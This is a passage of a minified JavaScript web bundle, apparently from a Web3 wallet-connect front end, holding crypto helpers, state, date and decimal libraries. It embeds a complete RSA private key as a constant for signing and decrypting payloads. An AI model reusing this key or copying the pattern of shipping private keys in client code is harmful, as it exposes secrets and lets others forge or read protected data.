`,u},e.publicKeyToOpenSSH=function(s,o){var a="ssh-rsa";o=o||"";var c=r.util.createBuffer();return i(c,a),t(c,s.e),t(c,s.n),a+" "+r.util.encode64(c.bytes())+" "+o},e.privateKeyToOpenSSH=function(s,o){return o?r.pki.encryptRsaPrivateKey(s,o,{legacy:!0,algorithm:"aes128"}):r.pki.privateKeyToPem(s)},e.getPublicKeyFingerprint=function(s,o){o=o||{};var a=o.md||r.md.md5.create(),c="ssh-rsa",l=r.util.createBuffer();i(l,c),t(l,s.e),t(l,s.n),a.start(),a.update(l.getBytes());var u=a.digest();if(o.encoding==="hex"){var d=u.toHex();return o.delimiter?d.match(/.{2}/g).join(o.delimiter):d}else{if(o.encoding==="binary")return u.getBytes();if(o.encoding)throw new Error('Unknown encoding "'+o.encoding+'".')}return u};function t(s,o){var a=o.toString(16);a[0]>="8"&&(a="00"+a);var c=r.util.hexToBytes(a);s.putInt32(c.length),s.putBytes(c)}function i(s,o){s.putInt32(o.length),s.putString(o)}function n(){for(var s=r.md.sha1.create(),o=arguments.length,a=0;a<o;++a)s.update(arguments[a]);return s.digest()}return Y_.exports}var J_,cL;function $pe(){return cL||(cL=1,J_=Lr(),Xg(),_pe(),Yd(),q$(),Zx(),Ape(),r4(),Ipe(),Tpe(),kpe(),vJ(),W$(),E3(),gJ(),yJ(),Npe(),xJ(),mJ(),fJ(),H$(),Au(),pJ(),Ppe(),CJ(),Ei()),J_}var Rpe=$pe();const wn=Ss(Rpe);function Ope(){return wn.random.getBytesSync(32)}function Bpe(){return wn.random.getBytesSync(16)}function Mpe(r,e){const t=wn.pki.privateKeyFromPem(e),i=wn.md.sha256.create();return i.update(r,"utf8"),t.sign(i)}function Dpe(r,e,t){const i=wn.pki.publicKeyFromPem(t),n=wn.md.sha256.create();return n.update(r,"utf8"),i.verify(n.digest().bytes(),e)}function Lpe(r,e){return wn.pki.publicKeyFromPem(e).encrypt(r,"RSA-OAEP",{md:wn.md.sha256.create(),mgf1:wn.mgf1.create()})}function Upe(r,e){return wn.pki.privateKeyFromPem(e).decrypt(r,"RSA-OAEP",{md:wn.md.sha256.create(),mgf1:wn.mgf1.create()})}function jpe(r,e,t){const i=wn.cipher.createCipher("AES-CBC",r);return i.start({iv:e}),i.update(wn.util.createBuffer(t)),i.finish(),i.output.getBytes()}function Fpe(r,e,t){const i=wn.cipher.createDecipher("AES-CBC",r);if(i.start({iv:e}),i.update(wn.util.createBuffer(t)),!i.finish())throw new Error("AES decryption failed");return i.output.getBytes()}function Xb(r,e,t){const i=JSON.stringify(r),n=Mpe(i,e),s=wn.util.createBuffer();s.putBytes(wn.util.encodeUtf8(i)),s.putBytes(n);const o=Ope(),a=Bpe(),c=jpe(o,a,s.bytes()),l=Lpe(o,t);return JSON.stringify({encryptedKey:wn.util.encode64(l),encryptedData:wn.util.encode64(c),iv:wn.util.encode64(a)})}function qpe(r,e,t){const{encryptedKey:i,encryptedData:n,iv:s}=JSON.parse(r),o=Upe(wn.util.decode64(i),e),a=Fpe(o,wn.util.decode64(s),wn.util.decode64(n)),c=a.length-256,l=a.slice(0,c),u=a.slice(c);if(!Dpe(l,u,t))throw new Error("Bad signature  data is forged or keys mismatched");return JSON.parse(wn.util.decodeUtf8(l))}const km=`-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAo+UGj8Wyi/Wrc/PZXVKU9vdJj8NU+49Me5cB7KyuY2mJTRCZ
E3kUNT+f7D1DjDRVMTOOPgzpg7ON8DbSgp0jgT/yTlbmC2CAEdDkBaIMMH4ElIAi
y2BtUJSEkCwG0Xcw7SPEeV6UOn+qVWgf5B8Aq+5LWeI2ZXV4sPc0Qqew2WO0kLwR
MSqHt754oV19ayIDT0ISKfoXqi/exWDzMvFBhh2I11aNv38maCi2sGdAWgOsl5qv
BAcbCL2J7cixT7MPTTgmICgiAhJiZE+sX3IKkQPhoXIqdKLm/dthTaBiQOVa43p+
MALcfnhPZw1vltZMy992anW0yHKAnsONTWVi/QIDAQABAoIBAEQs6VFWBgL1Uvg9
V85bo06mKAnu0YOBJOoGM009uZ7t0Cjn/h0dERxjVoVhKJ+CR2vbi9Bg86QOxTzG
uUOO1S2XKZaPzEqwPiXrFGcJdPOZABO7x319I4vQ8+G7Bq0MXSRP7BMmlhdNcs/r
K9TrVo6uZdbCZClJN8a5VhpiAg0zIypZWKpySH/97gSN0uZhFQ8LFC9hkh2A/2AY
tu0wdy18WzWBG0eQ2mHb0kxQRwFA8RhUL/qh0WZ7V8b94k+D2ZnlGC752GqQHxAV
z+zii32gHQ91Xjn0UZycmeCgeGY0dNSNhKEeMdfJEtoxzKufra5hIFPGAwe9VCgt
eFdpJGsCgYEA2raZWKmugUj4CwvdGApIm1Ql1yxz88V+C1YByG6BOcHc8MZaQ5CJ
0I51cow73Szvi1ImEj7HKdBOXM0Z4HsXROomdE2wTkexU0leV4DLYasvjbQ6ZCdm
MLPH2Giq5VpaPZ8wSijD2Isea/fiVdneIAo8GXinR+3NXRxwsi3XrJMCgYEAv9Xz
uJebxmfNpQQ2dJRmE7HrTu1DCkoS4gW5A/UI3gCvTUbZ8PUpvpEiDKzCPkovYfln
VM7PrZsVkI+VY1Z8zPxhvlRlLHz7xYOvlWeBFHvGxVcRkUecnyRxFojJn91T9W1l
+VmsVyMF3+3XLIZO/fx+v1gc7pFeDHSL6tbk/C8CgYA5c2OejZvgLAmz5R7jlLfz
zUvPVMb0jrkIQ0ReoOBjCpB90qydONdqqDEjsMB83bPiteZ4PnNUgXpEGEAm3k6D
dLo7LLkWJvDmfsxAUf2anzvzjhcUfeDzBBaHux7A9lXj/+/QWxruw8Ru+gNDJ+KY
KfgVfML8OvQJ9FGKDE6t7wKBgQCCQfCforIvYkSMi/O97RXywZiZmxkuX2W6+0/J
lBRVSfm+ayGJL68MqteH67ZpPU43JHY5a8QwiWF3K0ewkAVl2ukzp3KbZrI+R1Bu
Dj3jfrhVPu26y/lZRhFTz8W4OzzLJWFckrsm360ZhBHbNcdlRpF5s4bRpvtJUcm/
x/LsGQKBgGFQS7pkmX2s6X2ioiH3KYA1lhHpNj07PYOq2ZmhPcUfT3a9LGDU5AN8
+r4qhH7wzN0qqs2ahHMwAswkrRWRSP3XgogsVNrcHJQqP+6uZGifPsRTxh1qcmHO
tqiB0QbnSStllXEZmA2Li5s4Hn3LR//TpiM+5Fx0tXonStIhpxNT
-----END RSA PRIVATE KEY-----`,Nm=`-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApIfVmQ3pn5j0/BpdLOWS
DBSQQMPZcgtHpac9WcFnsoUuGDke+bB/loq880NXZXWZpvk8yOzJpSO2As6gy0uV
KAmgPpGVeVPNRI7ok3KAMRa5cosavCj2RL/7MZ7pIVJd0xM5Nsr2YYN4pMTVOMWF
vkDeP2OA0jTjCpAzZDWihy4e/QfY8WqTEn2M+1uq/jDvVrngUjNrYtUR7bIoPkGx
TNjECwhZPyM3zUPk7XIJLvKojVrob8b+h7CUyZIGZIVOhnApHh1B893DNN1uFVOH
sLoGm5jgSTdrQjfwfg6Zb22Mg3XuA5pU0B/5DK1nzNF4VHNtfmYtoDi2A3igerNV
xQIDAQAB
-----END PUBLIC KEY-----`,zpe=Symbol(),lL=Object.getPrototypeOf,uk=new WeakMap,Wpe=r=>r&&(uk.has(r)?uk.get(r):lL(r)===Object.prototype||lL(r)===Array.prototype),Hpe=r=>Wpe(r)&&r[zpe]||null,uL=(r,e=!0)=>{uk.set(r,e)},H9={},Q_=r=>typeof r=="object"&&r!==null,vf=new WeakMap,e5=new WeakSet,Vpe=(r=Object.is,e=(l,u)=>new Proxy(l,u),t=l=>Q_(l)&&!e5.has(l)&&(Array.isArray(l)||!(Symbol.iterator in l))&&!(l instanceof WeakMap)&&!(l instanceof WeakSet)&&!(l instanceof Error)&&!(l instanceof Number)&&!(l instanceof Date)&&!(l instanceof String)&&!(l instanceof RegExp)&&!(l instanceof ArrayBuffer),i=l=>{switch(l.status){case"fulfilled":return l.value;case"rejected":throw l.reason;default:throw l}},n=new WeakMap,s=(l,u,d=i)=>{const h=n.get(l);if(h?.[0]===u)return h[1];const f=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l));return uL(f,!0),n.set(l,[u,f]),Reflect.ownKeys(l).forEach(p=>{if(Object.getOwnPropertyDescriptor(f,p))return;const g=Reflect.get(l,p),{enumerable:w}=Reflect.getOwnPropertyDescriptor(l,p),m={value:g,enumerable:w,configurable:!0};if(e5.has(g))uL(g,!1);else if(g instanceof Promise)delete m.value,m.get=()=>d(g);else if(vf.has(g)){const[x,S]=vf.get(g);m.value=s(x,S(),d)}Object.defineProperty(f,p,m)}),Object.preventExtensions(f)},o=new WeakMap,a=[1,1],c=l=>{if(!Q_(l))throw new Error("object required");const u=o.get(l);if(u)return u;let d=a[0];const h=new Set,f=(N,L=++a[0])=>{d!==L&&(d=L,h.forEach($=>$(N,L)))};let p=a[1];const g=(N=++a[1])=>(p!==N&&!h.size&&(p=N,m.forEach(([L])=>{const $=L[1](N);$>d&&(d=$)})),d),w=N=>(L,$)=>{const y=[...L];y[1]=[N,...y[1]],f(y,$)},m=new Map,x=(N,L)=>{if((H9?"production":void 0)!=="production"&&m.has(N))throw new Error("prop listener already exists");if(h.size){const $=L[3](w(N));m.set(N,[L,$])}else m.set(N,[L])},S=N=>{var L;const $=m.get(N);$&&(m.delete(N),(L=$[1])==null||L.call($))},T=N=>(h.add(N),h.size===1&&m.forEach(([$,y],A)=>{if((H9?"production":void 0)!=="production"&&y)throw new Error("remove already exists");const b=$[3](w(A));m.set(A,[$,b])}),()=>{h.delete(N),h.size===0&&m.forEach(([$,y],A)=>{y&&(y(),m.set(A,[$]))})}),k=Array.isArray(l)?[]:Object.create(Object.getPrototypeOf(l)),E=e(k,{deleteProperty(N,L){const $=Reflect.get(N,L);S(L);const y=Reflect.deleteProperty(N,L);return y&&f(["delete",[L],$]),y},set(N,L,$,y){const A=Reflect.has(N,L),b=Reflect.get(N,L,y);if(A&&(r(b,$)||o.has($)&&r(b,o.get($))))return!0;S(L),Q_($)&&($=Hpe($)||$);let v=$;if($ instanceof Promise)$.then(_=>{$.status="fulfilled",$.value=_,f(["resolve",[L],_])}).catch(_=>{$.status="rejected",$.reason=_,f(["reject",[L],_])});else{!vf.has($)&&t($)&&(v=c($));const _=!e5.has(v)&&vf.get(v);_&&x(L,_)}return Reflect.set(N,L,v,y),f(["set",[L],$,b]),!0}});o.set(l,E);const C=[k,g,s,T];return vf.set(E,C),Reflect.ownKeys(l).forEach(N=>{const L=Object.getOwnPropertyDescriptor(l,N);"value"in L&&(E[N]=l[N],delete L.value,delete L.writable),Object.defineProperty(k,N,L)}),E})=>[c,vf,e5,r,e,t,i,n,s,o,a],[Kpe]=Vpe();function sr(r={}){return Kpe(r)}function ai(r,e,t){const i=vf.get(r);(H9?"production":void 0)!=="production"&&!i&&console.warn("Please use proxy object");let n;const s=[],o=i[3];let a=!1;const l=o(u=>{s.push(u),n||(n=Promise.resolve().then(()=>{n=void 0,a&&e(s.splice(0))}))});return a=!0,()=>{a=!1,l()}}function kd(r,e){const t=vf.get(r);(H9?"production":void 0)!=="production"&&!t&&console.warn("Please use proxy object");const[i,n,s]=t;return s(i,n(),e)}function Ra(r){return e5.add(r),r}function ci(r,e,t,i){let n=r[e];return ai(r,()=>{const s=r[e];Object.is(n,s)||t(n=s)})}function _J(r){const e=sr({data:Array.from([]),has(t){return this.data.some(i=>i[0]===t)},set(t,i){const n=this.data.find(s=>s[0]===t);return n?n[1]=i:this.data.push([t,i]),this},get(t){var i;return(i=this.data.find(n=>n[0]===t))==null?void 0:i[1]},delete(t){const i=this.data.findIndex(n=>n[0]===t);return i===-1?!1:(this.data.splice(i,1),!0)},clear(){this.data.splice(0)},get size(){return this.data.length},toJSON(){return new Map(this.data)},forEach(t){this.data.forEach(i=>{t(i[1],i[0],this)})},keys(){return this.data.map(t=>t[0]).values()},values(){return this.data.map(t=>t[1]).values()},entries(){return new Map(this.data).entries()},get[Symbol.toStringTag](){return"Map"},[Symbol.iterator](){return this.entries()}});return Object.defineProperties(e,{data:{enumerable:!1},size:{enumerable:!1},toJSON:{enumerable:!1}}),Object.seal(e),e}var J8={exports:{}},Gpe=J8.exports,dL;function Zpe(){return dL||(dL=1,function(r,e){(function(t,i){r.exports=i()})(Gpe,function(){var t=1e3,i=6e4,n=36e5,s="millisecond",o="second",a="minute",c="hour",l="day",u="week",d="month",h="quarter",f="year",p="date",g="Invalid Date",w=/^(\d{4})[-/]?(\d{1,2})?[-/]?(\d{0,2})[Tt\s]*(\d{1,2})?:?(\d{1,2})?:?(\d{1,2})?[.:]?(\d+)?$/,m=/\[([^\]]+)]|Y{1,4}|M{1,4}|D{1,2}|d{1,4}|H{1,2}|h{1,2}|a|A|m{1,2}|s{1,2}|Z{1,2}|SSS/g,x={name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(b){var v=["th","st","nd","rd"],_=b%100;return"["+b+(v[(_-20)%10]||v[_]||v[0])+"]"}},S=function(b,v,_){var O=String(b);return!O||O.length>=v?b:""+Array(v+1-O.length).join(_)+b},T={s:S,z:function(b){var v=-b.utcOffset(),_=Math.abs(v),O=Math.floor(_/60),D=_%60;return(v<=0?"+":"-")+S(O,2,"0")+":"+S(D,2,"0")},m:function b(v,_){if(v.date()<_.date())return-b(_,v);var O=12*(_.year()-v.year())+(_.month()-v.month()),D=v.clone().add(O,d),R=_-D<0,P=v.clone().add(O+(R?-1:1),d);return+(-(O+(_-D)/(R?D-P:P-D))||0)},a:function(b){return b<0?Math.ceil(b)||0:Math.floor(b)},p:function(b){return{M:d,y:f,w:u,d:l,D:p,h:c,m:a,s:o,ms:s,Q:h}[b]||String(b||"").toLowerCase().replace(/s$/,"")},u:function(b){return b===void 0}},k="en",I={};I[k]=x;var E="$isDayjsObject",C=function(b){return b instanceof y||!(!b||!b[E])},N=function b(v,_,O){var D;if(!v)return k;if(typeof v=="string"){var R=v.toLowerCase();I[R]&&(D=R),_&&(I[R]=_,D=R);var P=v.split("-");if(!D&&P.length>1)return b(P[0])}else{var B=v.name;I[B]=v,D=B}return!O&&D&&(k=D),D||!O&&k},L=function(b,v){if(C(b))return b.clone();var _=typeof v=="object"?v:{};return _.date=b,_.args=arguments,new y(_)},$=T;$.l=N,$.i=C,$.w=function(b,v){return L(b,{locale:v.$L,utc:v.$u,x:v.$x,$offset:v.$offset})};var y=function(){function b(_){this.$L=N(_.locale,null,!0),this.parse(_),this.$x=this.$x||_.x||{},this[E]=!0}var v=b.prototype;return v.parse=function(_){this.$d=function(O){var D=O.date,R=O.utc;if(D===null)return new Date(NaN);if($.u(D))return new Date;if(D instanceof Date)return new Date(D);if(typeof D=="string"&&!/Z$/i.test(D)){var P=D.match(w);if(P){var B=P[2]-1||0,M=(P[7]||"0").substring(0,3);return R?new Date(Date.UTC(P[1],B,P[3]||1,P[4]||0,P[5]||0,P[6]||0,M)):new Date(P[1],B,P[3]||1,P[4]||0,P[5]||0,P[6]||0,M)}}return new Date(D)}(_),this.init()},v.init=function(){var _=this.$d;this.$y=_.getFullYear(),this.$M=_.getMonth(),this.$D=_.getDate(),this.$W=_.getDay(),this.$H=_.getHours(),this.$m=_.getMinutes(),this.$s=_.getSeconds(),this.$ms=_.getMilliseconds()},v.$utils=function(){return $},v.isValid=function(){return this.$d.toString()!==g},v.isSame=function(_,O){var D=L(_);return this.startOf(O)<=D&&D<=this.endOf(O)},v.isAfter=function(_,O){return L(_)<this.startOf(O)},v.isBefore=function(_,O){return this.endOf(O)<L(_)},v.$g=function(_,O,D){return $.u(_)?this[O]:this.set(D,_)},v.unix=function(){return Math.floor(this.valueOf()/1e3)},v.valueOf=function(){return this.$d.getTime()},v.startOf=function(_,O){var D=this,R=!!$.u(O)||O,P=$.p(_),B=function(U,G){var Z=$.w(D.$u?Date.UTC(D.$y,G,U):new Date(D.$y,G,U),D);return R?Z:Z.endOf(l)},M=function(U,G){return $.w(D.toDate()[U].apply(D.toDate("s"),(R?[0,0,0,0]:[23,59,59,999]).slice(G)),D)},W=this.$W,K=this.$M,q=this.$D,J="set"+(this.$u?"UTC":"");switch(P){case f:return R?B(1,0):B(31,11);case d:return R?B(1,K):B(0,K+1);case u:var le=this.$locale().weekStart||0,ae=(W<le?W+7:W)-le;return B(R?q-ae:q+(6-ae),K);case l:case p:return M(J+"Hours",0);case c:return M(J+"Minutes",1);case a:return M(J+"Seconds",2);case o:return M(J+"Milliseconds",3);default:return this.clone()}},v.endOf=function(_){return this.startOf(_,!1)},v.$set=function(_,O){var D,R=$.p(_),P="set"+(this.$u?"UTC":""),B=(D={},D[l]=P+"Date",D[p]=P+"Date",D[d]=P+"Month",D[f]=P+"FullYear",D[c]=P+"Hours",D[a]=P+"Minutes",D[o]=P+"Seconds",D[s]=P+"Milliseconds",D)[R],M=R===l?this.$D+(O-this.$W):O;if(R===d||R===f){var W=this.clone().set(p,1);W.$d[B](M),W.init(),this.$d=W.set(p,Math.min(this.$D,W.daysInMonth())).$d}else B&&this.$d[B](M);return this.init(),this},v.set=function(_,O){return this.clone().$set(_,O)},v.get=function(_){return this[$.p(_)]()},v.add=function(_,O){var D,R=this;_=Number(_);var P=$.p(O),B=function(K){var q=L(R);return $.w(q.date(q.date()+Math.round(K*_)),R)};if(P===d)return this.set(d,this.$M+_);if(P===f)return this.set(f,this.$y+_);if(P===l)return B(1);if(P===u)return B(7);var M=(D={},D[a]=i,D[c]=n,D[o]=t,D)[P]||1,W=this.$d.getTime()+_*M;return $.w(W,this)},v.subtract=function(_,O){return this.add(-1*_,O)},v.format=function(_){var O=this,D=this.$locale();if(!this.isValid())return D.invalidDate||g;var R=_||"YYYY-MM-DDTHH:mm:ssZ",P=$.z(this),B=this.$H,M=this.$m,W=this.$M,K=D.weekdays,q=D.months,J=D.meridiem,le=function(G,Z,j,Y){return G&&(G[Z]||G(O,R))||j[Z].slice(0,Y)},ae=function(G){return $.s(B%12||12,G,"0")},U=J||function(G,Z,j){var Y=G<12?"AM":"PM";return j?Y.toLowerCase():Y};return R.replace(m,function(G,Z){return Z||function(j){switch(j){case"YY":return String(O.$y).slice(-2);case"YYYY":return $.s(O.$y,4,"0");case"M":return W+1;case"MM":return $.s(W+1,2,"0");case"MMM":return le(D.monthsShort,W,q,3);case"MMMM":return le(q,W);case"D":return O.$D;case"DD":return $.s(O.$D,2,"0");case"d":return String(O.$W);case"dd":return le(D.weekdaysMin,O.$W,K,2);case"ddd":return le(D.weekdaysShort,O.$W,K,3);case"dddd":return K[O.$W];case"H":return String(B);case"HH":return $.s(B,2,"0");case"h":return ae(1);case"hh":return ae(2);case"a":return U(B,M,!0);case"A":return U(B,M,!1);case"m":return String(M);case"mm":return $.s(M,2,"0");case"s":return String(O.$s);case"ss":return $.s(O.$s,2,"0");case"SSS":return $.s(O.$ms,3,"0");case"Z":return P}return null}(G)||P.replace(":","")})},v.utcOffset=function(){return 15*-Math.round(this.$d.getTimezoneOffset()/15)},v.diff=function(_,O,D){var R,P=this,B=$.p(O),M=L(_),W=(M.utcOffset()-this.utcOffset())*i,K=this-M,q=function(){return $.m(P,M)};switch(B){case f:R=q()/12;break;case d:R=q();break;case h:R=q()/3;break;case u:R=(K-W)/6048e5;break;case l:R=(K-W)/864e5;break;case c:R=K/n;break;case a:R=K/i;break;case o:R=K/t;break;default:R=K}return D?R:$.a(R)},v.daysInMonth=function(){return this.endOf(d).$D},v.$locale=function(){return I[this.$L]},v.locale=function(_,O){if(!_)return this.$L;var D=this.clone(),R=N(_,O,!0);return R&&(D.$L=R),D},v.clone=function(){return $.w(this.$d,this)},v.toDate=function(){return new Date(this.valueOf())},v.toJSON=function(){return this.isValid()?this.toISOString():null},v.toISOString=function(){return this.$d.toISOString()},v.toString=function(){return this.$d.toUTCString()},b}(),A=y.prototype;return L.prototype=A,[["$ms",s],["$s",o],["$m",a],["$H",c],["$W",l],["$M",d],["$y",f],["$D",p]].forEach(function(b){A[b[1]]=function(v){return this.$g(v,b[0],b[1])}}),L.extend=function(b,v){return b.$i||(b(v,y,L),b.$i=!0),L},L.locale=N,L.isDayjs=C,L.unix=function(b){return L(1e3*b)},L.en=I[k],L.Ls=I,L.p={},L})}(J8)),J8.exports}var Ype=Zpe();const rw=Ss(Ype);var Q8={exports:{}},Jpe=Q8.exports,hL;function Qpe(){return hL||(hL=1,function(r,e){(function(t,i){r.exports=i()})(Jpe,function(){return{name:"en",weekdays:"Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),months:"January_February_March_April_May_June_July_August_September_October_November_December".split("_"),ordinal:function(t){var i=["th","st","nd","rd"],n=t%100;return"["+t+(i[(n-20)%10]||i[n]||i[0])+"]"}}})}(Q8)),Q8.exports}var Xpe=Qpe();const e1e=Ss(Xpe);var X8={exports:{}},t1e=X8.exports,fL;function r1e(){return fL||(fL=1,function(r,e){(function(t,i){r.exports=i()})(t1e,function(){return function(t,i,n){t=t||{};var s=i.prototype,o={future:"in %s",past:"%s ago",s:"a few seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",M:"a month",MM:"%d months",y:"a year",yy:"%d years"};function a(l,u,d,h){return s.fromToBase(l,u,d,h)}n.en.relativeTime=o,s.fromToBase=function(l,u,d,h,f){for(var p,g,w,m=d.$locale().relativeTime||o,x=t.thresholds||[{l:"s",r:44,d:"second"},{l:"m",r:89},{l:"mm",r:44,d:"minute"},{l:"h",r:89},{l:"hh",r:21,d:"hour"},{l:"d",r:35},{l:"dd",r:25,d:"day"},{l:"M",r:45},{l:"MM",r:10,d:"month"},{l:"y",r:17},{l:"yy",d:"year"}],S=x.length,T=0;T<S;T+=1){var k=x[T];k.d&&(p=h?n(l).diff(d,k.d,!0):d.diff(l,k.d,!0));var I=(t.rounding||Math.round)(Math.abs(p));if(w=p>0,I<=k.r||!k.r){I<=1&&T>0&&(k=x[T-1]);var E=m[k.l];f&&(I=f(""+I)),g=typeof E=="string"?E.replace("%d",I):E(I,u,k.l,w);break}}if(u)return g;var C=w?m.future:m.past;return typeof C=="function"?C(g):C.replace("%s",g)},s.to=function(l,u){return a(l,u,this,!0)},s.from=function(l,u){return a(l,u,this)};var c=function(l){return l.$u?n.utc():n()};s.toNow=function(l){return this.to(c(this),l)},s.fromNow=function(l){return this.from(c(this),l)}}})}(X8)),X8.exports}var i1e=r1e();const n1e=Ss(i1e);var e9={exports:{}},s1e=e9.exports,pL;function o1e(){return pL||(pL=1,function(r,e){(function(t,i){r.exports=i()})(s1e,function(){return function(t,i,n){n.updateLocale=function(s,o){var a=n.Ls[s];if(a)return(o?Object.keys(o):[]).forEach(function(c){a[c]=o[c]}),a}}})}(e9)),e9.exports}var a1e=o1e();const c1e=Ss(a1e);rw.extend(n1e);rw.extend(c1e);const l1e={...e1e,name:"en-web3-modal",relativeTime:{future:"in %s",past:"%s ago",s:"%d sec",m:"1 min",mm:"%d min",h:"1 hr",hh:"%d hrs",d:"1 d",dd:"%d d",M:"1 mo",MM:"%d mo",y:"1 yr",yy:"%d yr"}},u1e=["January","February","March","April","May","June","July","August","September","October","November","December"];rw.locale("en-web3-modal",l1e);const V9={getMonthNameByIndex(r){return u1e[r]},getYear(r=new Date().toISOString()){return rw(r).year()},getRelativeDateFromNow(r){return rw(r).locale("en-web3-modal").fromNow(!0)},formatDate(r,e="DD MMM"){return rw(r).format(e)}},SJ={caipNetworkIdToNumber(r){return r?Number(r.split(":")[1]):void 0},parseEvmChainId(r){return typeof r=="string"?this.caipNetworkIdToNumber(r):r},getNetworksByNamespace(r,e){return r?.filter(t=>t.chainNamespace===e)||[]},getFirstNetworkByNamespace(r,e){return this.getNetworksByNamespace(r,e)[0]}};var d1e=20,h1e=1,K1=1e6,gL=1e6,f1e=-7,p1e=21,g1e=!1,n4="[big.js] ",t2=n4+"Invalid ",Qx=t2+"decimal places",m1e=t2+"rounding mode",AJ=n4+"Division by zero",ji={},yd=void 0,w1e=/^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;function IJ(){function r(e){var t=this;if(!(t instanceof r))return e===yd?IJ():new r(e);if(e instanceof r)t.s=e.s,t.e=e.e,t.c=e.c.slice();else{if(typeof e!="string"){if(r.strict===!0&&typeof e!="bigint")throw TypeError(t2+"value");e=e===0&&1/e<0?"-0":String(e)}b1e(t,e)}t.constructor=r}return r.prototype=ji,r.DP=d1e,r.RM=h1e,r.NE=f1e,r.PE=p1e,r.strict=g1e,r.roundDown=0,r.roundHalfUp=1,r.roundHalfEven=2,r.roundUp=3,r}function b1e(r,e){var t,i,n;if(!w1e.test(e))throw Error(t2+"number");for(r.s=e.charAt(0)=="-"?(e=e.slice(1),-1):1,(t=e.indexOf("."))>-1&&(e=e.replace(".","")),(i=e.search(/e/i))>0?(t<0&&(t=i),t+=+e.slice(i+1),e=e.substring(0,i)):t<0&&(t=e.length),n=e.length,i=0;i<n&&e.charAt(i)=="0";)++i;if(i==n)r.c=[r.e=0];else{for(;n>0&&e.charAt(--n)=="0";);for(r.e=t-i-1,r.c=[],t=0;i<=n;)r.c[t++]=+e.charAt(i++)}return r}function r2(r,e,t,i){var n=r.c;if(t===yd&&(t=r.constructor.RM),t!==0&&t!==1&&t!==2&&t!==3)throw Error(m1e);if(e<1)i=t===3&&(i||!!n[0])||e===0&&(t===1&&n[0]>=5||t===2&&(n[0]>5||n[0]===5&&(i||n[1]!==yd))),n.length=1,i?(r.e=r.e-e+1,n[0]=1):n[0]=r.e=0;else if(e<n.length){if(i=t===1&&n[e]>=5||t===2&&(n[e]>5||n[e]===5&&(i||n[e+1]!==yd||n[e-1]&1))||t===3&&(i||!!n[0]),n.length=e,i){for(;++n[--e]>9;)if(n[e]=0,e===0){++r.e,n.unshift(1);break}}for(e=n.length;!n[--e];)n.pop()}return r}function i2(r,e,t){var i=r.e,n=r.c.join(""),s=n.length;if(e)n=n.charAt(0)+(s>1?"."+n.slice(1):"")+(i<0?"e":"e+")+i;else if(i<0){for(;++i;)n="0"+n;n="0."+n}else if(i>0)if(++i>s)for(i-=s;i--;)n+="0";else i<s&&(n=n.slice(0,i)+"."+n.slice(i));else s>1&&(n=n.charAt(0)+"."+n.slice(1));return r.s<0&&t?"-"+n:n}ji.abs=function(){var r=new this.constructor(this);return r.s=1,r};ji.cmp=function(r){var e,t=this,i=t.c,n=(r=new t.constructor(r)).c,s=t.s,o=r.s,a=t.e,c=r.e;if(!i[0]||!n[0])return i[0]?s:n[0]?-o:0;if(s!=o)return s;if(e=s<0,a!=c)return a>c^e?1:-1;for(o=(a=i.length)<(c=n.length)?a:c,s=-1;++s<o;)if(i[s]!=n[s])return i[s]>n[s]^e?1:-1;return a==c?0:a>c^e?1:-1};ji.div=function(r){var e=this,t=e.constructor,i=e.c,n=(r=new t(r)).c,s=e.s==r.s?1:-1,o=t.DP;if(o!==~~o||o<0||o>K1)throw Error(Qx);if(!n[0])throw Error(AJ);if(!i[0])return r.s=s,r.c=[r.e=0],r;var a,c,l,u,d,h=n.slice(),f=a=n.length,p=i.length,g=i.slice(0,a),w=g.length,m=r,x=m.c=[],S=0,T=o+(m.e=e.e-r.e)+1;for(m.s=s,s=T<0?0:T,h.unshift(0);w++<a;)g.push(0);do{for(l=0;l<10;l++){if(a!=(w=g.length))u=a>w?1:-1;else for(d=-1,u=0;++d<a;)if(n[d]!=g[d]){u=n[d]>g[d]?1:-1;break}if(u<0){for(c=w==a?n:h;w;){if(g[--w]<c[w]){for(d=w;d&&!g[--d];)g[d]=9;--g[d],g[w]+=10}g[w]-=c[w]}for(;!g[0];)g.shift()}else break}x[S++]=u?l:++l,g[0]&&u?g[w]=i[f]||0:g=[i[f]]}while((f++<p||g[0]!==yd)&&s--);return!x[0]&&S!=1&&(x.shift(),m.e--,T--),S>T&&r2(m,T,t.RM,g[0]!==yd),m};ji.eq=function(r){return this.cmp(r)===0};ji.gt=function(r){return this.cmp(r)>0};ji.gte=function(r){return this.cmp(r)>-1};ji.lt=function(r){return this.cmp(r)<0};ji.lte=function(r){return this.cmp(r)<1};ji.minus=ji.sub=function(r){var e,t,i,n,s=this,o=s.constructor,a=s.s,c=(r=new o(r)).s;if(a!=c)return r.s=-c,s.plus(r);var l=s.c.slice(),u=s.e,d=r.c,h=r.e;if(!l[0]||!d[0])return d[0]?r.s=-c:l[0]?r=new o(s):r.s=1,r;if(a=u-h){for((n=a<0)?(a=-a,i=l):(h=u,i=d),i.reverse(),c=a;c--;)i.push(0);i.reverse()}else for(t=((n=l.length<d.length)?l:d).length,a=c=0;c<t;c++)if(l[c]!=d[c]){n=l[c]<d[c];break}if(n&&(i=l,l=d,d=i,r.s=-r.s),(c=(t=d.length)-(e=l.length))>0)for(;c--;)l[e++]=0;for(c=e;t>a;){if(l[--t]<d[t]){for(e=t;e&&!l[--e];)l[e]=9;--l[e],l[t]+=10}l[t]-=d[t]}for(;l[--c]===0;)l.pop();for(;l[0]===0;)l.shift(),--h;return l[0]||(r.s=1,l=[h=0]),r.c=l,r.e=h,r};ji.mod=function(r){var e,t=this,i=t.constructor,n=t.s,s=(r=new i(r)).s;if(!r.c[0])throw Error(AJ);return t.s=r.s=1,e=r.cmp(t)==1,t.s=n,r.s=s,e?new i(t):(n=i.DP,s=i.RM,i.DP=i.RM=0,t=t.div(r),i.DP=n,i.RM=s,this.minus(t.times(r)))};ji.neg=function(){var r=new this.constructor(this);return r.s=-r.s,r};ji.plus=ji.add=function(r){var e,t,i,n=this,s=n.constructor;if(r=new 